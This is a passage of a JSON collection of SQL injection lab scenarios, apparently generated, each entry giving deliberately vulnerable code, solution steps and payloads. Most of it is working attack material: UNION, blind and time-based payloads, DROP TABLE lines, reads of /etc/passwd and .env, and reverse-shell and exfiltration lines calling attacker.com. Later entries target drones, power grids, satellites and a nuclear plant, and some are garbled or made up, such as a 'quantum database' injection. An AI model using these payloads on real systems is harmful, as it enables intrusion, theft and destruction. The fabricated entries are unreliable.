      "Correlate response delays with SUBSTR(allergy_info,1,1)='A' conditions",
      "Reconstruct full medical history from 15,000+ possible combinations"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/get-medications', (req, res) => {\n  const patientId = req.body.id;\n  const query = `SELECT drug_name FROM prescriptions WHERE patient_id='${patientId}'`;\n  \n  oracle.execute(query, (err, result) => {\n    res.status(result.rows.length > 0 ? 200 : 404).send();\n  });\n});",
    "payloads": [
      "' OR (SELECT BITAND(ASCII(SUBSTR(allergy_info,1,1)),128)=128--",
      "' AND (SELECT LENGTH(ssn) FROM patients WHERE id=1)=9--"
    ]
  },
  {
    "Lab scenario": "IoT Device Management UNION-Based SQLi in API Endpoint",
    "Lab Description": "An industrial IoT dashboard constructs SQL queries using unsanitized device IDs from REST parameters. The MySQL backend allows stacked queries but blocks UNION unless column counts match exactly. To solve: Extract AWS IoT Core certificates by forcing JSON type coercion through CONCAT(0x7b,private_key) and bypassing TLS fingerprint validation in the management API.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept GET /devices/12345/status request",
      "Modify path parameter: /devices/12345' UNION SELECT NULL,CONCAT('{\"key\":\"',private_key,'\"}') FROM iot_certs--/status",
      "Handle JSON parsing errors through charset manipulation",
      "Convert hex-encoded results to PEM format",
      "Validate certificates against AWS IoT endpoint"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/devices/:id/status', (req, res) => {\n  const deviceId = req.params.id;\n  const query = `SELECT status, timestamp FROM devices WHERE id='${deviceId}'`;\n  \n  pool.query(query, (err, result) => {\n    res.json(result.rows[0]);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,LOAD_FILE('/etc/iot/config.json')--",
      "' AND SLEEP(IF(ASCII(SUBSTR(private_key,1,1))>100,5,0))--"
    ]
  },
  {
    "Lab scenario": "Social Media Platform Error-Based SQLi in Comment Section",
    "Lab Description": "A social media platform's comment moderation system directly interpolates user input into DELETE statements. The Microsoft SQL Server leaks full query plans through verbose errors when invalid type conversions occur. To solve: Exfiltrate OAuth tokens and DM conversations by forcing arithmetic overflow errors in XML PATH queries containing secret data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Post comment: '); DELETE FROM comments WHERE 1=CAST((SELECT TOP 1 token FROM oauth_tokens) AS INT)--",
      "Analyze error message containing truncated OAuth token",
      "Use FOR XML PATH to concatenate full tokens",
      "Bypass CSP protections using ADODB.Stream object",
      "Automate token extraction using error differential analysis"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.delete('/comments/:id', (req, res) => {\n  const commentId = req.params.id;\n  const query = `DELETE FROM comments WHERE id='${commentId}'`;\n  \n  mssql.query(query, (err) => {\n    if(err) res.status(500).send(err.message);\n    else res.send('Comment removed');\n  });\n});",
    "payloads": [
      "'); BEGIN TRY SELECT CONVERT(INT, (SELECT token FROM oauth_tokens)) END TRY BEGIN CATCH SELECT ERROR_MESSAGE() END CATCH--",
      "'); SELECT 1/0 FROM OPENROWSET(BULK '\\attacker.com\\exfil', SINGLE_BLOB)--"
    ]
  },
  {
    "Lab scenario": "Banking Application Second-Order SQLi in User Registration",
    "Lab Description": "A neo-banking app stores unsanitized occupation fields that get used in nightly KYC report generation. The PostgreSQL cron job runs with elevated privileges, allowing attackers to overwrite audit logs. To solve: Poison user profiles with CTE expressions containing pg_cancel_backend() and COPY TO PROGRAM calls to establish reverse shells through delayed job execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Register with occupation: '); CREATE TEMP TABLE exfil AS SELECT * FROM wire_transfers--",
      "Wait 23:00 UTC for report generation trigger",
      "Monitor netcat listener for database dumps",
      "Escalate privileges using SECURITY DEFINER functions",
      "Cover tracks using VACUUM FULL and log rotation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/register', (req, res) => {\n  const occupation = req.body.occupation;\n  const query = `INSERT INTO users (occupation) VALUES ('${occupation}')`;\n  \n  pool.query(query, () => {\n    res.send('Account pending review');\n  });\n});",
    "payloads": [
      "'); SELECT pg_sleep(10); COPY users TO PROGRAM 'nc attacker.com 4444'--",
      "'); CREATE SERVER exfil FOREIGN DATA WRAPPER file_fdw--"
    ]
  },
  {
    "Lab scenario": "Educational Platform Time-Based SQLi in Course Enrollment",
    "Lab Description": "A university course enrollment system uses unsanitized student IDs in SQLite queries. The system returns identical error pages but allows time-based inference through randomblob() function calls. To solve: Extract exam answers and grade curves by measuring response delays when querying encrypted BLOB columns in the course_materials table.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept POST /enroll request with student_id parameter",
      "Inject: ' OR CASE WHEN (SELECT hex(substr(answer,1,1))='41' THEN randomblob(100000000) ELSE 0 END--",
      "Use Python requests with 0.1-second timing precision",
      "Brute-force AES-encrypted answers using known IV patterns",
      "Decrypt results using leaked course API keys"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/enroll', (req, res) => {\n  const studentId = req.body.student_id;\n  const query = `SELECT * FROM courses WHERE student_id='${studentId}'`;\n  \n  db.all(query, (err, rows) => {\n    res.send(rows.length > 0 ? 'Enrolled' : 'Invalid ID');\n  });\n});",
    "payloads": [
      "' OR (SELECT LENGTH(answer) FROM course_materials)=500 AND randomblob(100000000)--",
      "' AND 1=CAST((SELECT COUNT(*) FROM sqlite_master WHERE sql LIKE '%answer%') AS INTEGER)--"
    ]
  },
  {
    "Lab scenario": "Government Portal UNION SQLi in Document Search",
    "Lab Description": "A classified document search portal concatenates user input into ORDER BY clauses of Oracle queries. The application uses APEX authentication but leaks execution plans through utl_http calls. To solve: Exfiltrate nuclear facility blueprints by bypassing ORA-00904 errors through OUTER JOIN payloads and converting BFILEs to Base64-encoded strings in UNION SELECT clauses.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept GET /search?sort=date request",
      "Inject: date UNION SELECT NULL,utl_raw.cast_to_varchar2(utl_encode.base64_encode(bfilename('CLASSIFIED_DIR',file_name))) FROM blueprints--",
      "Bypass TNS listener encryption using SQL*Net bypass",
      "Reconstruct PDFs from chunked Base64 responses",
      "Circumvent Data Redaction policies through XMLType extraction"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const sort = req.query.sort || 'date';\n  const query = `SELECT doc_id, title FROM documents ORDER BY ${sort}`;\n  \n  oracle.execute(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "date UNION SELECT SYS_CONTEXT('USERENV','CURRENT_SCHEMA'), NULL FROM DUAL--",
      "title UNION SELECT (SELECT XMLAGG(XMLELEMENT(e, text)).getClobVal() FROM redacted_docs), NULL--"
    ]
  },
  {
    "Lab scenario": "Logistics Management System Stacked Queries via CSV Export",
    "Lab Description": "A freight tracking system's CSV export feature uses unsanitized input in COPY TO statements. Attackers can execute OS commands through PostgreSQL's COPY FROM PROGRAM and create reverse shells using Python subprocesses encoded in hex. The vulnerability is compounded by the application running as root with NOPASSWD sudo privileges.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept GET /export?filter=1",
      "Inject: 1); COPY shipments FROM PROGRAM 'python3 -c \\'import socket,subprocess,os;s=socket.socket();s.connect(\\\"attacker.com\\\",443);[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(\\\"/bin/sh\\\")\\''--",
      "Monitor reverse shell connections",
      "Escalate privileges using sudo -l misconfigurations",
      "Dump entire shipment database using pg_dump"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/export', (req, res) => {\n  const filter = req.query.filter;\n  const query = `COPY (SELECT * FROM shipments WHERE ${filter}) TO STDOUT CSV`;\n  \n  pool.query(query, (err) => {\n    res.attachment('export.csv');\n  });\n});",
    "payloads": [
      "1); CREATE TABLE pwn AS SELECT * FROM pg_user--",
      "0; DROP TABLE IF EXISTS audit_logs CASCADE--"
    ]
  },
  {
    "Lab scenario": "Telemedicine App JWT-Triggered SQLi in Patient Records",
    "Lab Description": "A HIPAA-compliant telemedicine platform embeds JWT claims in SQL WHERE clauses without validation. Attackers can forge tokens with UNION payloads containing XPath expressions to extract radiology images stored as PostgreSQL BYTEA. The challenge requires bypassing Content Security Policies and reconstructing DICOM files from hex-encoded binary chunks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Decode JWT using HS256 brute-force",
      "Modify sub claim: ' UNION SELECT encode(image_data,'hex'), current_setting('data_directory') FROM scans--",
      "Bypass CORS restrictions using credentialed fetch()",
      "Reassemble DICOM files using Python bitarray",
      "Validate images with Orthanc DICOM viewer"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/patient-records', (req, res) => {\n  const patientId = jwtVerify(req.cookies.token).sub;\n  const query = `SELECT * FROM records WHERE patient_id='${patientId}'`;\n  \n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,pg_read_file('/etc/passwd')--",
      "'||(SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE NULL END)--"
    ]
  },
  {
    "Lab scenario": "Cloud Storage API SQL Injection via Metadata Field",
    "Lab Description": "A cloud storage service processes file metadata using vulnerable JSONB path queries in PostgreSQL. Attackers can exploit jsonb_set() function to overwrite IAM policies and exfiltrate S3 pre-signed URLs through malformed JSON responses containing UNION-injected bucket permissions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Upload file with metadata: {\"tags\": \"'||(SELECT jsonb_set(config,'{policy}','\"admin\"'::jsonb) FROM buckets)--\"}",
      "Trigger metadata processing cron job",
      "Extract pre-signed URLs from AWS SDK errors",
      "Bypass bucket policies using modified IAM roles",
      "Exfiltrate data using curl with stolen URLs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/upload', (req, res) => {\n  const metadata = req.body.metadata;\n  const query = `INSERT INTO files (metadata) VALUES ('${metadata}')`;\n  \n  pool.query(query, (err) => {\n    res.send('File processed');\n  });\n});",
    "payloads": [
      "'||(SELECT encode(convert_to(pg_read_file('/.env'),'base64'))::jsonb--",
      "' WHERE 1=0 UNION SELECT current_setting('aws.keys')--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Search Functionality",
    "Lab Description": "The search functionality does not properly sanitize user input, allowing for SQL injection. The application uses user-supplied search terms directly in SQL queries, exposing it to attack. To solve: Inject malicious SQL to retrieve sensitive data or modify the database.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept search request using Burp Suite",
      "Identify vulnerable search input field",
      "Inject SQL payload into the search query: ' OR 1=1--",
      "Retrieve all data from the 'users' table by modifying the query: ' UNION SELECT username, password FROM users--",
      "Extract sensitive data, such as usernames and passwords"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const { searchTerm } = req.query;\n  const query = `SELECT * FROM products WHERE name LIKE '%${searchTerm}%'`; \n  db.query(query, (err, results) => {\n    res.render('searchResults', { products: results });\n  });\n});",
    "payloads": [
      "' OR 1=1--",
      "' UNION SELECT username, password FROM users--",
      "'; DROP TABLE products--",
      "' OR 'a'='a"
    ]
  },
  {
    "Lab scenario": "SQL injection in a REST API's product search query",
    "Lab Description": "This lab demonstrates a UNION-based SQL injection vulnerability in a product search query of a REST API. The API takes a product name as a query parameter and executes a direct SQL query without sanitization. To solve the lab, exploit this vulnerability to enumerate the database version.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the API request containing the product name parameter.",
      "2. Perform a basic UNION attack to determine the number of columns being returned by the query using the payload: ' OR 1=1 UNION SELECT NULL, NULL, NULL --",
      "3. Once the number of columns is identified, modify the payload to retrieve the database version using: ' UNION SELECT NULL, version(), NULL --",
      "4. Verify the database version is returned in the response.",
      "5. Exploit further by attempting to extract other sensitive information from the database."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, description TEXT)\");\n  db.run(\"INSERT INTO products (name, description) VALUES ('Product1', 'A test product')\");\n  db.run(\"INSERT INTO products (name, description) VALUES ('Product2', 'Another test product')\");\n});\n\napp.get('/search', (req, res) => {\n  const search = req.query.name || '';\n  const query = `SELECT * FROM products WHERE name = '${search}'`;  // Vulnerability here\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error executing query.\");\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
    "payloads": [
      "' OR 1=1 UNION SELECT NULL, NULL, NULL --",
      "' UNION SELECT NULL, version(), NULL --"
    ]
  },
  {
    "Lab scenario": "Boolean-based blind SQL injection in login form",
    "Lab Description": "This lab demonstrates a boolean-based blind SQL injection vulnerability in a login form. The application uses a vulnerable query that doesn't provide direct error messages but does change the page content based on the result. To solve the lab, infer the administrator's password length using boolean conditions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the login request and modify the parameters.",
      "2. Test for a basic boolean injection by submitting ' OR 1=1 -- to the username parameter and check if login succeeds.",
      "3. Start testing for the length of the administrator's password by submitting ' AND LENGTH(password) > 10 --",
      "4. If true, decrease the number until you identify the exact length of the password.",
      "5. Once the length is found, use substring-based attacks to find each character of the password."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('administrator', 'admin12345')\");\n});\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`; // Vulnerability here\n  db.get(query, [], (err, row) => {\n    if (err) {\n      res.status(500).send(\"Error executing query.\");\n    } else if (row) {\n      res.send('Login successful!');\n    } else {\n      res.send('Login failed.');\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
    "payloads": [
      "' OR 1=1 --",
      "' AND LENGTH(password) > 10 --"
    ]
  },
  {
    "Lab scenario": "Time-based SQL injection in account balance query",
    "Lab Description": "This lab demonstrates a time-based SQL injection vulnerability in an account balance query. The application performs a delay in response when an invalid query is executed. To solve the lab, infer the balance of a target account by sending time-delayed SQL injection queries.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept and modify the request that checks for account balance.",
      "2. Test for a delay-based injection by submitting ' OR 1=1 SLEEP(5) -- to the account ID parameter.",
      "3. If the response is delayed by 5 seconds, confirm the presence of time-based SQL injection.",
      "4. Use the SLEEP function to progressively test different account IDs and infer the balance by observing response times.",
      "5. Perform full exploitation to reveal the balance of a specific account."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE accounts (id INTEGER PRIMARY KEY, balance INTEGER)\");\n  db.run(\"INSERT INTO accounts (id, balance) VALUES (1, 1000)\");\n  db.run(\"INSERT INTO accounts (id, balance) VALUES (2, 2000)\");\n});\n\napp.get('/balance', (req, res) => {\n  const id = req.query.id || '';\n  const query = `SELECT balance FROM accounts WHERE id = '${id}'`; // Vulnerability here\n  db.get(query, [], (err, row) => {\n    if (err) {\n      res.status(500).send(\"Error executing query.\");\n    } else {\n      res.json({ balance: row ? row.balance : 'Not Found' });\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
    "payloads": [
      "' OR 1=1 SLEEP(5) --"
    ]
  },
  {
    "Lab scenario": "SQL injection bypassing input filters with case manipulation",
    "Lab Description": "This lab demonstrates a SQL injection vulnerability where input filters only allow certain characters. The application sanitizes input but does not properly handle case differences. To solve the lab, bypass the filter and perform a UNION-based SQL injection attack.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept and modify the request containing the 'username' parameter.",
      "2. Try submitting a basic payload such as ' OR 1=1 -- and observe if the input is blocked.",
      "3. Bypass the filter by submitting ' oR 1=1 -- with case manipulation.",
      "4. Once the filter bypass is successful, perform a UNION attack to enumerate database tables.",
      "5. Verify the attack's success by extracting information from the database."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('admin', 'password123')\");\n});\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`; // Vulnerability here\n  db.get(query, [], (err, row) => {\n    if (err) {\n      res.status(500).send(\"Error executing query.\");\n    } else if (row) {\n      res.send('Login successful!');\n    } else {\n      res.send('Login failed.');\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
    "payloads": [
      "' OR 1=1 --",
      "' oR 1=1 --"
    ]
  },
  {
    "Lab scenario": "SQL injection in SOAP API",
    "Lab Description": "This lab demonstrates a SQL injection vulnerability in a SOAP API. The API accepts parameters through XML input, which is not sanitized properly. To solve the lab, perform an SQL injection attack using UNION to retrieve sensitive data from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept and modify the SOAP request that passes parameters in XML format.",
      "2. Analyze the XML input for a vulnerable query and test for basic SQL injection with ' OR 1=1 --",
      "3. Use a UNION-based SQL injection to retrieve sensitive database information like usernames or email addresses.",
      "4. Verify the data extraction by confirming a valid response containing the extracted information.",
      "5. Attempt further exploitation, such as obtaining database schema information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst xmlParser = require('xml2js').parseString;\n\nconst app = express();\napp.use(express.text());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (username TEXT, email TEXT)\");\n  db.run(\"INSERT INTO users (username, email) VALUES ('admin', 'admin@example.com')\");\n});\n\napp.post('/soap', (req, res) => {\n  xmlParser(req.body, (err, result) => {\n    const username = result.Envelope.Body[0].Request[0].username[0];\n    const query = `SELECT * FROM users WHERE username = '${username}'`; // Vulnerability here\n    db.all(query, [], (err, rows) => {\n      if (err) {\n        res.status(500).send(\"Error executing query.\");\n      } else {\n        res.json(rows);\n      }\n    });\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT NULL, email FROM users --"
    ]
  },
  {
    "Lab scenario": "Blockchain Oracle SQLi with Smart Contract Trigger",
    "Lab Description": "A DeFi price oracle executes SQL queries based on Ethereum smart contract events stored in PostgreSQL. The Node.js listener fails to validate calldata parameters, allowing attackers to inject UNION payloads through forged ERC-721 Transfer events. The vulnerability enables manipulation of token price feeds by concatenating malicious WHERE clauses containing arithmetic overflow conditions. To solve: Exploit the Chainlink external adapter interface to overwrite ETH/USD rates using hex-encoded byte32 payloads containing pg_notify() calls.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept Chainlink HTTP GET job request using Mitmproxy",
      "Forge Transfer event with _tokenId: '1 UNION SELECT 5000 AS price WHERE 1=CAST((SELECT 1/0) AS NUMERIC)--'",
      "Bypass EIP-712 signature validation using malleability attack",
      "Trigger price update via keeper.chain.link",
      "Liquidate leveraged positions using manipulated rates"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/chainlink', (req, res) => {\n  const event = req.body.events[0];\n  const query = `INSERT INTO oracle_data (value) \n    VALUES ('${event.returnValues.tokenId}')`;\n  \n  pool.query(query, (err) => {\n    res.json({success: !err});\n  });\n});",
    "payloads": [
      "'||(SELECT pg_notify('attack', current_database()))--",
      "'::bytea || (SELECT encode(private_key,'hex') FROM validators--"
    ]
  },
  {
    "Lab scenario": "Surgical Robot Control System Time-Based SQLi",
    "Lab Description": "A ROS2-based surgical interface stores procedure logs in SQLite with unsanitized JSON metadata. The C++ middleware allows time-based inference through std::this_thread::sleep_for() calls in WHERE clauses. To solve: Exfiltrate patient biometric encryption keys by measuring 50ms response delay variances using SUBSTR(SHA3-256(ecg_data),1,4) comparisons and bypass CRC32 checksum validation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture DDS topic /surgical_metrics with Wireshark",
      "Inject ROS2 parameter: ' OR 1=IIF(HEX(SUBSTR(key,1,1))>7F, SLEEP(0.05),0)--",
      "Use real-time QPID Proton analysis for nanosecond timing",
      "Reconstruct 256-bit AES-GCM keys from 62,000 samples",
      "Decrypt surgery video streams using extracted keys"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "void log_procedure(const char* metadata) {\n  std::string query = \"INSERT INTO surgery_logs VALUES ('\" + std::string(metadata) + \"')\";\n  sqlite3_exec(db, query.c_str(), 0, 0, 0);\n}",
    "payloads": [
      "{\"time\":\"'||(SELECT CASE WHEN load_extension('exploit.so') THEN 1 ELSE 0 END)--\"}",
      "' AND 1=CAST((SELECT COUNT(*) FROM sqlite_master WHERE name LIKE '%biometrics%') AS INT)--"
    ]
  },
  {
    "Lab scenario": "Satellite Ground Station UNION SQLi via CCSDS Telemetry",
    "Lab Description": "A satellite command system processes CCSDS packet APIDs through vulnerable PostgreSQL stored procedures. Attackers can inject frame_count parameters containing UNION SELECT payloads to overwrite NORAD TLE data. The challenge requires bypassing Reed-Solomon error correction and aligning columns using SPIREnt test equipment timing.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture Uplink signal at 2.4GHz using HackRF",
      "Encode payload: ' UNION SELECT 255,ST_AsText(sensitive_area) FROM military_sats-- as APID 0x500",
      "Bypass checksum via polynomial code manipulation",
      "Verify TLE changes using celestrak.org API",
      "Trigger collision course using spoofed ephemeris data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "CREATE FUNCTION process_telemetry(packet JSONB) RETURNS VOID AS $$\nBEGIN\n  EXECUTE 'INSERT INTO frames VALUES (' || packet->>'apid' || ')'; \nEND; $$ LANGUAGE plpgsql;",
    "payloads": [
      "500 UNION SELECT ST_GeomFromText('POLYGON(...)') FROM classified LIMIT 1--",
      "0x01 WHERE (SELECT octet_length(encrypted_payload) FROM comms WHERE freq=2250.5)=256--"
    ]
  },
  {
    "Lab scenario": "Quantum Database Error-Based SQLi in Shor's Algorithm",
    "Lab Description": "A post-quantum cryptography system implements Grover's algorithm for SQL optimization, leaking error states through IBM Qiskit backend exceptions. Attackers can force modulus overflow errors in WHERE clauses containing factored primes. To solve: Extract RSA-4096 private keys by solving discrete logarithm problems revealed in amplitude amplification error messages.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initialize 15-qubit circuit with GroverOperator",
      "Encode payload: WHERE n % (SELECT p FROM primes) = 0",
      "Measure error density using QASM simulator",
      "Calculate prime factors via error differentials",
      "Reconstruct private exponent using Chinese Remainder Theorem"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "def grover_search(input_hash):\n    query = f\"SELECT * FROM keys WHERE sha256 = '{input_hash}'\"\n    qc.append(GroverOperator(oracle(query)), range(15))\n    return execute(qc)",
    "payloads": [
      "' OR 1=CAST((SELECT 1/0 FROM keys LIMIT 1) AS INTEGER)--",
      "'))); DROP TABLE IF EXISTS secure_keys CASCADE--"
    ]
  },
  {
    "Lab scenario": "5G Core Network SQLi in AMF Registration",
    "Lab Description": "A 5G Access and Mobility Management Function (AMF) stores UE contexts in MariaDB with unsanitized SUPI parameters. Attackers can inject Handover Required messages containing GTP-U extensions with UNION payloads to disclose Kseaf derivation keys. Requires bypassing PFCP session validation and aligning column counts using NAS encryption type offsets.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture N2 interface traffic using UERANSIM",
      "Forge SUPI: ' UNION SELECT CONCAT(hex(kseaf),',',hex(kamf)) FROM auth_vector--",
      "Bypass SEAL encryption via chosen-IV attack",
      "Extract 256-bit keys from Registration Accept messages",
      "Derivate Kgnb for false base station MiTM attacks"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "void process_registration(uint8_t* supi) {\n  char query[256];\n  sprintf(query, \"SELECT * FROM ue_context WHERE supi='%s'\", supi);\n  mysql_query(conn, query);\n}",
    "payloads": [
      "' AND 1=CAST((SELECT COUNT(*) FROM 5g_security.vectors) AS UNSIGNED INTEGER)--",
      "'||(SELECT LOAD_FILE('/etc/5g/ausf.conf'))--"
    ]
  },
  {
    "Lab scenario": "Industrial SCADA SQLi via Modbus/TCP",
    "Lab Description": "A SCADA system maps Modbus holding registers to SQLite queries using function code 0x17. Attackers can overwrite PID controller setpoints through injected WHERE clauses containing IEEE-754 floating point exploits. The challenge requires precise timing to bypass CRC checks and align payloads with RTU poll cycles.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture Modbus FC23 traffic using ModScan",
      "Craft register write: ' WHERE tag='BOILER' UNION SELECT 500.0-- as Float32",
      "Bypash LRC checksum via bitflip attack",
      "Verify setpoint change through OPC UA monitoring",
      "Trigger emergency shutdown through overflow values"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "void handle_modbus(uint8_t* pdu) {\n  char query[128];\n  float setpoint = decode_float(pdu);\n  sprintf(query, \"UPDATE tags SET value=%.2f WHERE id=%d\", setpoint, unit_id);\n  sqlite3_exec(db, query, 0, 0, 0);\n}",
    "payloads": [
      "NaN WHERE 1=1 UNION SELECT 1e308--",
      "-INF WHERE (SELECT changes()=0)--"
    ]
  },
  {
    "Lab scenario": "Military Drone SQLi in MAVLink Mission Protocol",
    "Lab Description": "A UAV ground control system stores flight paths in PostgreSQL with unsanitized MAVLink MISSION_ITEM_INT parameters. Attackers can inject arbitrary SRID transformations through UNION payloads containing ST_Transform() calls to redirect drones. Requires bypassing packet sequence validation and aligning column counts with PG_GEOMETRY metadata.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Spoof MAVLink system ID using QGroundControl",
      "Forge MISSION_ITEM_INT with x: '500 UNION SELECT ST_Transform(target_geo,3857) FROM strike_targets--",
      "Bypass CRC-EXTRA validation via bitmasking",
      "Verify coordinate system override in QGIS",
      "Intercept drone using spoofed GPS+RTL payloads"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "void save_mission(mavlink_mission_item_int_t item) {\n  char query[256];\n  sprintf(query, \"INSERT INTO flightplan (x,y) VALUES (%d,%d)\", item.x, item.y);\n  PQexec(pgconn, query);\n}",
    "payloads": [
      "2147483647 WHERE 1=0 UNION SELECT ST_X(geom),ST_Y(geom) FROM sensitive_locations--",
      "0); SELECT pg_terminate_backend(pg_backend_pid())--"
    ]
  },
  {
    "Lab scenario": "Smart Grid SQLi via IEC 61850 GOOSE",
    "Lab Description": "A power distribution system maps IEC 61850 GOOSE messages to MySQL queries. Attackers can inject Logical Node names containing boolean-based payloads to disable circuit breakers. The challenge requires precise timing to bypass SMV sampling synchronization and manipulate CURRENT_TAP_SETTING values.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture GOOSE traffic using Wireshark dissector",
      "Modify LN: 'XCBR1' OR (SELECT status FROM breakers)=1-- as Boolean",
      "Bypass APPID filtering using VLAN hopping",
      "Trigger cascade failure by forcing tap_changer=999",
      "Bypass differential protection using current injection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "void process_goose(IEC61850_GOOSE* goose) {\n  char query[256];\n  sprintf(query, \"UPDATE devices SET enabled=1 WHERE ln='%s'\", goose->dataSet);\n  mysql_query(conn, query);\n}",
    "payloads": [
      "'XCBR1' AND 1=CAST((SELECT COUNT(*) FROM scada_passwords) AS SIGNED INTEGER)--",
      "'MMXU1' WHERE (SELECT ASCII(SUBSTR(password,1,1)) FROM engineers)>90--"
    ]
  },
  {
    "Lab scenario": "Nuclear Plant SQLi in OPC UA Historian",
    "Lab Description": "A reactor monitoring system stores OPC UA historized data in TimescaleDB. Attackers can inject malformed NodeIds containing UNION payloads to falsify core temperature readings. Requires bypassing UA SecureChannel nonce validation and aligning column types using IEEE-754 DOUBLE conversions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture OPC UA ReadRequest using UA Expert",
      "Forge NodeId: 'ns=6;s=' UNION SELECT 900.0 FROM sensor_limits--",
      "Bypass SignatureAlgorithm RSA-PSS-SHA256",
      "Override PID controller setpoints via false readings",
      "Trigger SCRAM through forged neutron flux values"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "void historize_node(const UA_NodeId* node) {\n  char query[512];\n  sprintf(query, \"SELECT value FROM telemetry WHERE node='%s'\", \n          UA_NodeId_toString(node));\n  PGresult* res = PQexec(conn, query);\n}",
    "payloads": [
      "ns=6;s=') UNION SELECT CAST(radiation_level AS DOUBLE PRECISION) FROM core_sensors--",
      "ns=4;s='); SELECT create_hypertable('sensors', 'time')--"
    ]
  },
  {
    "Lab scenario": "Submarine Cable SQLi via OTN Framing",
